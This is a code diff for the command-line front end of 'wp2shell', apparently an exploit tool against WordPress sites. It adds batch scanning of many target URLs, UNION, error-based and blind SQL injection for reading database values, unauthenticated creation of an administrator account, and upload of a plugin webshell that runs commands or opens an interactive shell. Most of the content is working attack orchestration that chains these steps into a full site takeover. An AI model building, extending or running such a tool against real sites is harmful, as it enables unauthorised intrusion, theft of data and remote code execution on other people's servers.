@@ -4,15 +4,18 @@ from __future__ import annotations
 
 import argparse
 import copy
+import os
+import re
 import shlex
 import sys
 from pathlib import Path
-from typing import Optional
+from typing import List, Optional
 
 from . import __version__
-from .client import BatchClient
+from .client import BatchClient, TargetError
+from .exploit import PreAuthAdminCreator
 from .shell import AdminSession
-from .sqli import BlindSQLi
+from .sqli import BlindSQLi, ErrorBasedSQLi, UnionSQLi
 from .version import public_version_hints, version_status, wordpress_markers
 
 try:
@@ -60,7 +63,6 @@ def _client(args: argparse.Namespace) -> BatchClient:
     return BatchClient(
         args.url,
         timeout=args.timeout,
-        rest_route=args.rest_route,
         proxy=args.proxy,
     )
 
@@ -88,10 +90,11 @@ def _print_version_hints(client: BatchClient) -> tuple:
 
     info("Public WordPress version hints:")
     for hint in hints:
-        print(
+        line = (
             f"    - {hint.version} via {hint.source} "
             f"({version_status(hint.version)}) - {_short(hint.detail)}"
         )
+        print(_paint("33", line) if hint.affected else _paint("32", line))
     if any(hint.affected for hint in hints):
         warn("A public version hint falls in the wp2shell affected range; verify internally or confirm with authorization.")
     return hints
@@ -111,12 +114,63 @@ def _load_targets(path: str) -> list[str]:
 # -- commands ---------------------------------------------------------------
 
 
+_URL_RE = re.compile(r"https?://\S+")
+
+
+def _resolve_targets(value: str) -> List[str]:
+    """Resolve the check target: a single URL, or the http(s):// URLs listed in a file.
+
+    A file is accepted only if it actually contains http:// or https:// URLs. Lines without a
+    scheme (bare domains, comments, blanks) are ignored, and a file with no URLs is rejected.
+    """
+    if _URL_RE.search(value):
+        return [value.strip()]
+    if os.path.isfile(value):
+        urls: List[str] = []
+        seen = set()
+        with open(value, encoding="utf-8", errors="replace") as handle:
+            for line in handle:
+                match = _URL_RE.search(line)
+                if match and match.group(0) not in seen:
+                    seen.add(match.group(0))
+                    urls.append(match.group(0))
+        if not urls:
+            raise ValueError(f"{value}: no http:// or https:// URLs found in file")
+        return urls
+    raise ValueError(f"{value!r} is not a URL (http[s]://...) or a file containing such URLs")
+
+
 def cmd_check(args: argparse.Namespace) -> int:
+    try:
+        targets = _resolve_targets(args.url)
+    except ValueError as exc:
+        bad(str(exc))
+        return 2
+    if len(targets) == 1:
+        return _check_one(targets[0], args)
+
+    info(f"Scanning {len(targets)} targets from {args.url}")
+    vulnerable = 0
+    for index, url in enumerate(targets, start=1):
+        print()
+        info(f"[{index}/{len(targets)}] {url}")
+        try:
+            rc = _check_one(url, args)
+        except TargetError as exc:
+            bad(str(exc))
+            rc = 1
+        if rc == 0:
+            vulnerable += 1
+    print()
+    (good if vulnerable else info)(f"Scan complete: {vulnerable}/{len(targets)} vulnerable.")
+    return 0 if vulnerable else 2
+
+
+def _check_one(url: str, args: argparse.Namespace) -> int:
     # The confirmation request sleeps for --sleep, so the timeout must exceed it.
     client = BatchClient(
-        args.url,
+        url,
         timeout=max(args.timeout, args.sleep + 10),
-        rest_route=args.rest_route,
         proxy=args.proxy,
     )
     _print_wordpress_markers(client)
@@ -136,13 +190,19 @@ def cmd_check(args: argparse.Namespace) -> int:
     if route_confusion:
         good("VULNERABLE — batch route-confusion behavior detected.")
         if not args.confirm_sqli:
-            info("SQL timing confirmation not sent; use --confirm-sqli for the active SQLi probe.")
+            info("SQLi confirmation not sent; use --confirm-sqli for the active SQLi probe.")
             return 0
     elif not args.confirm_sqli:
         bad("Route-confusion marker pattern not detected.")
         if any(hint.affected for hint in hints):
             warn("Version suggests exposure, but the batch marker probe did not show vulnerable behavior.")
         return 2
+
+    union = UnionSQLi(client)
+    if union.available():
+        good("SQLi confirmed — UNION fake-post read returned data.")
+        return 0
+    info("UNION SQLi confirmation unavailable; falling back to timing confirmation.")
 
     result = BlindSQLi(client, sleep=args.sleep).confirm_timing(samples=args.samples)
     if args.samples > 1:
@@ -159,16 +219,47 @@ def cmd_check(args: argparse.Namespace) -> int:
             f"SQL timing not confirmed — baseline {result.baseline:.2f}s, injected "
             f"{result.delayed:.2f}s; route-confusion marker pattern still detected."
         )
+        warn("A WAF or edge rule may be filtering the SQLi payload; the route-confusion bug still looks present.")
         return 0
     bad(f"Not timing-confirmed — baseline {result.baseline:.2f}s, injected {result.delayed:.2f}s.")
+    warn("This may be a patched target, or a WAF/edge rule filtering the SQLi payload.")
     if any(hint.affected for hint in hints):
         warn("Version suggests exposure, but the timing payload did not execute or was blocked.")
     return 2
 
 
+def _reader(args: argparse.Namespace, client: BatchClient):
+    """Pick the extraction technique.
+
+    auto prefers the fastest in-band method that works: UNION (one request per value, forges a fake
+    WP_Post), then error-based (needs reflected DB errors), then blind binary search.
+    """
+    if args.technique in ("auto", "union"):
+        union = UnionSQLi(client)
+        if union.available():
+            good("UNION extraction available (in-band, one request per value) — using it.")
+            return union
+        if args.technique == "union":
+            bad("UNION extraction requested but the forged post was not reflected.")
+            return None
+        info("UNION extraction unavailable; trying error-based.")
+    if args.technique in ("auto", "error"):
+        error_based = ErrorBasedSQLi(client)
+        if error_based.available():
+            good("Error-based extraction available (target reflects DB errors) — using it.")
+            return error_based
+        if args.technique == "error":
+            bad("Error-based extraction requested but the target does not reflect DB errors.")
+            return None
+        info("Target does not reflect DB errors; falling back to blind extraction.")
+    return BlindSQLi(client)
+
+
 def cmd_read(args: argparse.Namespace) -> int:
     client = _client(args)
-    sqli = BlindSQLi(client)
+    sqli = _reader(args, client)
+    if sqli is None:
+        return 2
 
     if args.query:
         info(f"Reading: {args.query}")
@@ -255,13 +346,33 @@ def cmd_shell(args: argparse.Namespace) -> int:
     if not args.cmd and not args.interactive:
         bad("specify --cmd or --interactive")
         return 2
+    if bool(args.user) != bool(args.password):
+        bad("specify both --user and --password, or omit both to use the pre-auth bridge")
+        return 2
 
     warn("This uploads a plugin containing a webshell to the target.")
+
+    generated_admin = None
+    username, password = args.user, args.password
+    if username is None:
+        warn("No credentials supplied; attempting pre-auth administrator creation.")
+        creator = PreAuthAdminCreator(
+            args.url,
+            timeout=args.timeout,
+            proxy=args.proxy,
+        )
+        info("Creating administrator through the SQLi-to-customizer bridge...")
+        generated_admin = creator.create_admin()
+        username, password = generated_admin.username, generated_admin.password
+        good(f"Administrator created: {username}")
+
     session = AdminSession(args.url, timeout=args.timeout, proxy=args.proxy)
 
-    info(f"Authenticating as {args.user!r}...")
-    if not session.login(args.user, args.password):
-        bad("Login failed. Supply valid admin credentials (crack the hash recovered by 'read').")
+    info(f"Authenticating as {username!r}...")
+    if not session.login(username, password):
+        bad("Login failed.")
+        if generated_admin:
+            warn("The pre-auth bridge appeared to run, but the generated credentials did not log in.")
         return 1
     good("Authenticated.")
 
@@ -288,28 +399,41 @@ def cmd_shell(args: argparse.Namespace) -> int:
                 propagate_interrupt=args.target_file is not None,
             )
     finally:
-        if args.cleanup:
-            info("Cleaning up webshell...")
+        if generated_admin:
+            info("Deleting generated administrator...")
             try:
-                removed = session.cleanup(path)
-            except Exception as exc:  # noqa: BLE001 - cleanup must not hide the original failure
-                bad(f"Cleanup failed ({exc}) — remove the plugin manually ({path}).")
-                rc = 1
+                removed_admin = session.delete_user_with_shell(
+                    path,
+                    generated_admin.username,
+                    reassign_to=generated_admin.source_admin_id,
+                )
+            except Exception:  # noqa: BLE001 - continue to remove the webshell.
+                removed_admin = False
+            if removed_admin:
+                good("Generated administrator removed from the target.")
             else:
-                if removed:
-                    good("Webshell removed from the target.")
-                else:
-                    bad(f"Cleanup failed — remove the plugin manually ({path}).")
-                    rc = 1
-        elif not args.keep:
-            warn(f"Remove the webshell when finished (delete {path} on the target).")
+                bad(f"Generated administrator cleanup failed: {generated_admin.username}:{generated_admin.password}")
+                rc = 1
+
+        info("Cleaning up webshell...")
+        try:
+            removed = session.cleanup(path)
+        except Exception as exc:  # noqa: BLE001 - cleanup must not hide the original failure
+            bad(f"Webshell cleanup failed ({exc}).")
+            rc = 1
+        else:
+            if removed:
+                good("Webshell removed from the target.")
+            else:
+                bad("Webshell cleanup failed.")
+                rc = 1
     return rc
 
 
 # -- parser -----------------------------------------------------------------
 
 
-def _add_common(parser: argparse.ArgumentParser, *, rest_route: bool = True) -> None:
+def _add_common(parser: argparse.ArgumentParser) -> None:
     targets = parser.add_mutually_exclusive_group(required=True)
     targets.add_argument("url", nargs="?", help="target base URL, e.g. http://target")
     targets.add_argument(
@@ -319,12 +443,6 @@ def _add_common(parser: argparse.ArgumentParser, *, rest_route: bool = True) -> 
         metavar="FILE",
         help="read target URLs from FILE, one per non-empty line",
     )
-    if rest_route:
-        parser.add_argument(
-            "--rest-route",
-            action="store_true",
-            help="use /?rest_route=/batch/v1 instead of /wp-json/batch/v1",
-        )
     parser.add_argument("--timeout", type=float, default=30.0, help="request timeout (default: 30)")
     parser.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080")
 
@@ -337,24 +455,27 @@ def build_parser() -> argparse.ArgumentParser:
     parser.add_argument("--version", action="version", version=f"wp2shell {__version__}")
     sub = parser.add_subparsers(dest="command", required=True)
 
-    check = sub.add_parser("check", help="safely confirm the vulnerability (non-destructive)")
+    check = sub.add_parser(
+        "check",
+        help="confirm the vulnerability on a URL, or scan a file of URLs (non-destructive)",
+    )
     _add_common(check)
     check.add_argument(
         "--sleep",
         type=float,
         default=3.0,
-        help="SQL timing delay used with --confirm-sqli (default: 3)",
+        help="SQL timing delay used by the --confirm-sqli fallback (default: 3)",
     )
     check.add_argument(
         "--samples",
         type=int,
         default=3,
-        help="baseline/delayed SQL timing pairs used with --confirm-sqli (default: 3)",
+        help="baseline/delayed SQL timing pairs used by the --confirm-sqli fallback (default: 3)",
     )
     check.add_argument(
         "--confirm-sqli",
         action="store_true",
-        help="also send the active SQL timing confirmation payload",
+        help="also send an active SQLi confirmation payload",
     )
     check.set_defaults(func=cmd_check)
 
@@ -370,20 +491,23 @@ def build_parser() -> argparse.ArgumentParser:
     group.add_argument("--query", help='scalar SQL expression to read, e.g. "SELECT @@version"')
     read.add_argument("--prefix", default="wp_", help="database table prefix (default: wp_)")
     read.add_argument("--max-length", type=int, default=128, help="max characters per value")
+    read.add_argument(
+        "--technique",
+        choices=("auto", "union", "blind", "error"),
+        default="auto",
+        help="extraction technique: auto (union -> error-based -> blind), union (in-band, forges a "
+        "fake WP_Post; one request per value), error (in-band, needs visible DB errors), or blind "
+        "(bit-by-bit boolean/timing)",
+    )
     read.set_defaults(func=cmd_read)
 
-    shell = sub.add_parser("shell", help="post-auth plugin webshell helper")
-    _add_common(shell, rest_route=False)  # shell uses wp-login/wp-admin directly, not the REST API
-    shell.add_argument("--user", required=True, help="admin username")
-    shell.add_argument("--password", required=True, help="admin password (cracked from the hash)")
+    shell = sub.add_parser("shell", help="plugin shell; with credentials or via the pre-auth bridge")
+    _add_common(shell)
+    shell.add_argument("--user", help="admin username; omit with --password to use the pre-auth bridge")
+    shell.add_argument("--password", help="admin password; omit with --user to use the pre-auth bridge")
     shell.add_argument("--cmd", help="command to run on the target (omit when using --interactive)")
     shell.add_argument("-i", "--interactive", action="store_true",
                        help="open an interactive shell after deploying")
-    retention = shell.add_mutually_exclusive_group()
-    retention.add_argument("--keep", action="store_true",
-                           help="do not warn about removing the webshell")
-    retention.add_argument("--cleanup", action="store_true",
-                           help="delete the webshell from the target when finished")
     shell.set_defaults(func=cmd_shell)
 
     return parser
